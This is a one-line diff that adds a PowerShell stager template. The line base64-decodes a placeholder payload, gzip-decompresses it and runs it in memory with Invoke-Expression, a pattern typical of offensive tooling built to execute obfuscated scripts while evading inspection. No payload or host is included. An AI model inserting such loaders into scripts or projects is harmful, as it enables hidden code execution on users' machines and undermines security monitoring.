@@ -1,0 +1,1 @@
+$script_source=New-Object('IO.MemoryStream')(,[Convert]::FromBase64String('{{BASE64}}'));IEX(New-Object('IO.StreamReader')(New-Object('IO.Compression.GzipStream')($script_source,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
